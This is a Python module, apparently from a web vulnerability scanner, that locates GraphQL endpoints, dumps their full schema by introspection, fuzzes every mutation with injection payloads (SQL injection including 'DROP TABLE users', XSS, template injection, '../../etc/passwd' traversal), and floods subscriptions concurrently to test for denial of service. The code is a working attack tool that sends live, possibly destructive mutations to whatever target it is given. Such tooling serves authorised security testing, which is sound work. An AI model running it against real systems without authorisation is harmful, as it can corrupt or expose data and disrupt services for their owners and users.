"""graphql_introspection_attacker.py — Auto-discover and attack GraphQL endpoints.

Uses full schema introspection to enumerate all types, queries, mutations, and
subscriptions then fuzzes each mutation with SQLi/XSS/SSTI/IDOR payloads and
probes subscriptions for resource-exhaustion DoS.
"""
from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import urllib.error
import urllib.parse
import urllib.request
from typing import Any, Dict, List, Optional

log = logging.getLogger("oneinfinity.graphql_introspection_attacker")

# ---------------------------------------------------------------------------
# Introspection query — full schema dump
# ---------------------------------------------------------------------------
_INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
  }
}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) {
    name description isDeprecated deprecationReason
    args { ...InputValue }
    type { ...TypeRef }
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue {
  name description
  type { ...TypeRef }
  defaultValue
}
fragment TypeRef on __Type {
  kind name
  ofType { kind name ofType { kind name ofType { kind name ofType {
    kind name ofType { kind name ofType { kind name ofType { kind name } } }
  } } } }
}
""".strip()

# ---------------------------------------------------------------------------
# Fuzzing payloads keyed by argument kind
# ---------------------------------------------------------------------------
_STRING_PAYLOADS = [
    # SQLi
    "' OR '1'='1",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL,NULL,NULL--",
    # XSS
    "<script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    # SSTI
    "{{7*7}}",
    "${7*7}",
    "<%=7*7%>",
    # IDOR / path traversal
    "../../etc/passwd",
    "admin",
    "0",
    "null",
]

_INT_PAYLOADS: List[Any] = [
    -1,
    -2147483648,   # INT_MIN
    2147483647,    # INT_MAX
    9999999999,
    0,
    999999,
]

_BOOLEAN_PAYLOADS: List[Any] = [None, 1, "true", "false"]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_fid(prefix: str, key: str) -> str:
    return hashlib.md5(f"{prefix}:{key}".encode()).hexdigest()[:16]


def _post_graphql(url: str, query: str, variables: Optional[dict] = None,
                  timeout: int = 10) -> tuple[int, dict]:
    """POST a GraphQL request; return (status_code, parsed_json_or_empty_dict)."""
    payload = json.dumps({"query": query, "variables": variables or {}}).encode()
    req = urllib.request.Request(
        url,
        data=payload,
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read()
            try:
                return resp.status, json.loads(body)
            except json.JSONDecodeError:
                return resp.status, {}
    except urllib.error.HTTPError as e:
        try:
            body = e.read()
            return e.code, json.loads(body)
        except Exception:
            return e.code, {}
    except Exception:
        return 0, {}


def _unwrap_type(type_ref: dict) -> str:
    """Recursively unwrap NON_NULL/LIST wrappers to get the named type."""
    if type_ref is None:
        return "String"
    if type_ref.get("name"):
        return type_ref["name"]
    return _unwrap_type(type_ref.get("ofType"))


def _scalar_kind(type_name: str) -> str:
    """Map a GraphQL scalar name to a broad category for payload selection."""
    name = (type_name or "").upper()
    if name in ("INT", "LONG", "BIGINT", "FLOAT", "DECIMAL", "NUMBER"):
        return "INT"
    if name in ("BOOLEAN", "BOOL"):
        return "BOOLEAN"
    return "STRING"


def _build_mutation_query(mutation_field: dict) -> tuple[str, dict]:
    """Build a simple GraphQL mutation string + variables dict for the given field."""
    name = mutation_field["name"]
    args = mutation_field.get("args") or []
    var_defs: List[str] = []
    var_refs: List[str] = []
    variables: Dict[str, Any] = {}

    for arg in args:
        arg_name = arg["name"]
        type_name = _unwrap_type(arg.get("type"))
        kind = _scalar_kind(type_name)
        var_defs.append(f"${arg_name}: {type_name}")
        var_refs.append(f"{arg_name}: ${arg_name}")
        # Seed with a neutral default so the query is syntactically valid
        if kind == "INT":
            variables[arg_name] = 1
        elif kind == "BOOLEAN":
            variables[arg_name] = True
        else:
            variables[arg_name] = "test"

    if var_defs:
        header = f"mutation FuzzMutation({', '.join(var_defs)})"
        body = f"{name}({', '.join(var_refs)})"
    else:
        header = "mutation FuzzMutation"
        body = f"{name}"

    query = f"{header} {{ {body} {{ __typename }} }}"
    return query, variables


# ---------------------------------------------------------------------------
# Main attacker class
# ---------------------------------------------------------------------------

class GraphQLIntrospectionAttacker:
    """Discover and attack a GraphQL endpoint via schema introspection."""

    def __init__(self, timeout: int = 10) -> None:
        self.timeout = timeout

    # ------------------------------------------------------------------
    # Step 1 — Introspection
    # ------------------------------------------------------------------

    async def introspect_and_extract(self, url: str) -> dict:
        """Run full introspection and return a structured schema dict.

        Returns:
            {
                "url": str,
                "introspection_enabled": bool,
                "types": list[dict],
                "queries": list[dict],
                "mutations": list[dict],
                "subscriptions": list[dict],
                "raw": dict,           # full parsed JSON from server
            }
        """
        loop = asyncio.get_event_loop()
        status, data = await loop.run_in_executor(
            None, _post_graphql, url, _INTROSPECTION_QUERY, None, self.timeout
        )

        result: dict = {
            "url": url,
            "introspection_enabled": False,
            "types": [],
            "queries": [],
            "mutations": [],
            "subscriptions": [],
            "raw": data,
        }

        schema = data.get("data", {}).get("__schema")
        if not schema:
            log.debug("GraphQL introspection disabled or not a GraphQL endpoint at %s", url)
            return result

        result["introspection_enabled"] = True
        all_types: List[dict] = schema.get("types") or []
        result["types"] = all_types

        query_type_name = (schema.get("queryType") or {}).get("name", "Query")
        mutation_type_name = (schema.get("mutationType") or {}).get("name")
        subscription_type_name = (schema.get("subscriptionType") or {}).get("name")

        type_map: Dict[str, dict] = {t["name"]: t for t in all_types if t.get("name")}

        if query_type_name and query_type_name in type_map:
            result["queries"] = type_map[query_type_name].get("fields") or []
        if mutation_type_name and mutation_type_name in type_map:
            result["mutations"] = type_map[mutation_type_name].get("fields") or []
        if subscription_type_name and subscription_type_name in type_map:
            result["subscriptions"] = type_map[subscription_type_name].get("fields") or []

        log.info(
            "GraphQL introspection at %s: %d queries, %d mutations, %d subscriptions",
            url, len(result["queries"]), len(result["mutations"]), len(result["subscriptions"]),
        )
        return result

    # ------------------------------------------------------------------
    # Step 2 — Mutation fuzzing
    # ------------------------------------------------------------------

    async def auto_fuzz_mutations(self, url: str) -> List[dict]:
        """Fuzz every discovered mutation with SQLi/XSS/SSTI/IDOR payloads.

        For each argument, select payloads by type:
        - Int   → large negative / overflow values
        - Bool  → null / string coercion
        - String → injection strings (SQLi, XSS, SSTI, IDOR)

        Returns list of finding dicts.
        """
        schema = await self.introspect_and_extract(url)
        findings: List[dict] = []

        if not schema["introspection_enabled"]:
            return findings

        # Introspection itself is a finding
        findings.append({
            "vuln_type": "graphql_introspection_enabled",
            "type": "graphql_introspection_enabled",
            "severity": "low",
            "confidence": 1.0,
            "source_type": "active",
            "url": url,
            "title": "GraphQL introspection enabled — full schema exposed",
            "evidence": (
                f"Introspection returned {len(schema['mutations'])} mutations, "
                f"{len(schema['queries'])} queries, "
                f"{len(schema['subscriptions'])} subscriptions"
            ),
            "payload": _INTROSPECTION_QUERY[:120] + "…",
            "finding_id": _make_fid("graphql_introspect", url),
            "remediation": "Disable introspection in production GraphQL servers.",
        })

        mutations = schema["mutations"]
        if not mutations:
            log.debug("No mutations found to fuzz at %s", url)
            return findings

        loop = asyncio.get_event_loop()

        for mutation in mutations:
            base_query, base_vars = _build_mutation_query(mutation)
            args = mutation.get("args") or []

            for arg in args:
                arg_name = arg["name"]
                type_name = _unwrap_type(arg.get("type"))
                kind = _scalar_kind(type_name)

                if kind == "INT":
                    payloads: List[Any] = _INT_PAYLOADS
                elif kind == "BOOLEAN":
                    payloads = _BOOLEAN_PAYLOADS
                else:
                    payloads = _STRING_PAYLOADS

                for payload_val in payloads:
                    fuzz_vars = dict(base_vars)
                    fuzz_vars[arg_name] = payload_val

                    status, resp_data = await loop.run_in_executor(
                        None,
                        _post_graphql,
                        url,
                        base_query,
                        fuzz_vars,
                        self.timeout,
                    )

                    errors = resp_data.get("errors") or []
                    resp_str = json.dumps(resp_data)

                    # Detect verbose stack traces or injection reflections
                    vuln: Optional[str] = None
                    evidence_detail: str = ""

                    if any(kw in resp_str.lower() for kw in
                           ("traceback", "syntaxerror", "exception", "stack trace",
                            "sql syntax", "column", "mysql_fetch", "ora-", "pg::")):
                        vuln = "graphql_mutation_injection_error_disclosure"
                        evidence_detail = f"Error disclosure in mutation '{mutation['name']}' arg '{arg_name}'"

                    elif (str(payload_val) in resp_str and
                          isinstance(payload_val, str) and
                          any(c in payload_val for c in ("'", "<", "{", "$", "%"))):
                        vuln = "graphql_mutation_injection_reflected"
                        evidence_detail = f"Payload reflected in mutation '{mutation['name']}' arg '{arg_name}'"

                    if vuln:
                        log.info("%s at %s mutation=%s arg=%s payload=%r",
                                 vuln, url, mutation["name"], arg_name, payload_val)
                        findings.append({
                            "vuln_type": vuln,
                            "type": vuln,
                            "severity": "high",
                            "confidence": 0.75,
                            "source_type": "active",
                            "url": url,
                            "title": (
                                f"GraphQL mutation injection — {mutation['name']}({arg_name})"
                            ),
                            "evidence": (
                                f"{evidence_detail}. "
                                f"HTTP {status}. Response snippet: {resp_str[:400]}"
                            ),
                            "payload": json.dumps({arg_name: payload_val}),
                            "finding_id": _make_fid(
                                "graphql_mutfuzz",
                                f"{url}:{mutation['name']}:{arg_name}:{payload_val}",
                            ),
                            "remediation": (
                                "Sanitise all GraphQL input arguments server-side. "
                                "Parameterise resolver queries. Suppress stack traces."
                            ),
                        })
                        # One finding per arg per mutation — move on
                        break

        return findings

    # ------------------------------------------------------------------
    # Step 3 — Subscription DoS probe
    # ------------------------------------------------------------------

    async def test_subscription_dos(self, url: str) -> Optional[dict]:
        """Subscribe to all discovered subscriptions simultaneously.

        Sends concurrent subscription initiation requests; if the server
        errors, drops, or times-out on >50% of them, flag a potential DoS.

        Returns a finding dict or None.
        """
        schema = await self.introspect_and_extract(url)
        subscriptions = schema.get("subscriptions") or []
        if not subscriptions:
            return None

        # Build simple subscription documents for each field
        sub_queries: List[str] = []
        for sub in subscriptions:
            name = sub["name"]
            sub_queries.append(f"subscription SubDos {{ {name} {{ __typename }} }}")

        if not sub_queries:
            return None

        loop = asyncio.get_event_loop()

        # Fire all subscription requests concurrently
        tasks = [
            loop.run_in_executor(None, _post_graphql, url, q, None, 5)
            for q in sub_queries
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        error_count = 0
        timeout_count = 0
        for r in results:
            if isinstance(r, Exception):
                timeout_count += 1
            else:
                status, data = r
                if status in (500, 503, 502) or (data.get("errors") and status >= 500):
                    error_count += 1

        total = len(sub_queries)
        fail_rate = (error_count + timeout_count) / max(total, 1)

        if fail_rate > 0.5:
            log.info(
                "GraphQL subscription DoS candidate at %s — %d/%d failed/timed out",
                url, error_count + timeout_count, total,
            )
            return {
                "vuln_type": "graphql_subscription_dos",
                "type": "graphql_subscription_dos",
                "severity": "medium",
                "confidence": 0.70,
                "source_type": "active",
                "url": url,
                "title": "GraphQL subscriptions susceptible to resource exhaustion DoS",
                "evidence": (
                    f"{error_count + timeout_count}/{total} simultaneous subscription "
                    f"requests caused server errors or timeouts (fail_rate={fail_rate:.0%})"
                ),
                "payload": f"{total} concurrent subscription requests",
                "finding_id": _make_fid("graphql_sub_dos", url),
                "remediation": (
                    "Apply per-client subscription limits and query complexity analysis. "
                    "Consider disabling unused subscriptions in production."
                ),
            }

        return None

    # ------------------------------------------------------------------
    # Public entry point
    # ------------------------------------------------------------------

    async def scan(self, url: str) -> List[dict]:
        """Run all GraphQL attacks and return combined findings list."""
        findings: List[dict] = []

        # Discover common GraphQL endpoint variants
        base = url.rstrip("/")
        candidates = [url]
        for suffix in ("/graphql", "/api/graphql", "/gql", "/query",
                       "/v1/graphql", "/graphiql", "/api/v1/graphql"):
            candidates.append(f"{base}{suffix}")

        # Try each candidate; stop at the first that has introspection enabled
        schema_url: Optional[str] = None
        loop = asyncio.get_event_loop()
        for candidate in candidates:
            status, data = await loop.run_in_executor(
                None, _post_graphql, candidate, _INTROSPECTION_QUERY, None, self.timeout
            )
            if data.get("data", {}).get("__schema"):
                schema_url = candidate
                log.info("GraphQL endpoint confirmed at %s", schema_url)
                break

        if schema_url is None:
            log.debug("No GraphQL endpoint found under %s", url)
            return findings

        # Mutation fuzzing (includes introspection-enabled finding)
        try:
            mut_findings = await self.auto_fuzz_mutations(schema_url)
            findings.extend(mut_findings)
        except Exception as exc:
            log.debug("auto_fuzz_mutations error at %s: %s", schema_url, exc)

        # Subscription DoS probe
        try:
            dos_finding = await self.test_subscription_dos(schema_url)
            if dos_finding:
                findings.append(dos_finding)
        except Exception as exc:
            log.debug("test_subscription_dos error at %s: %s", schema_url, exc)

        log.info("GraphQL attacker finished %s: %d findings", schema_url, len(findings))
        return findings


# ---------------------------------------------------------------------------
# Module-level convenience wrapper
# ---------------------------------------------------------------------------

async def scan_graphql(target: str) -> List[dict]:
    """Entry-point used by the unified scan engine."""
    attacker = GraphQLIntrospectionAttacker(timeout=10)
    return await attacker.scan(target)
